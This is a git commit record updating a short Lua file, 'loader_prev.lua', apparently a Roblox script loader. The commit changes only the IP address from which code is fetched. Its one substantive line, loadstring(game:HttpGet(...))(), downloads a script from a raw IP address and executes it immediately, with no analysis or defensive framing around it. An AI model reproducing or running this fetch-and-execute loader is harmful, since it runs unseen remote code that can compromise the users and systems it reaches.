abdc808c6965c7ec49963ced82628e45d0d25a01
tesexrahy <tesexrahy@gmail.com>
2025-09-20 12:51:40 +0400

    Update loader_prev.lua

--- loader_prev.lua
+++ loader_prev.lua
@@ -1,2 +1,2 @@
 ID="a7266030-606f-4882-a9fc-e4dfbbb51ce1";
-loadstring(game:HttpGet("http://5.129.217.87:3910/cdn/loader.luau"))()
+loadstring(game:HttpGet("http://109.71.240.235:3910/cdn/loader.luau"))()
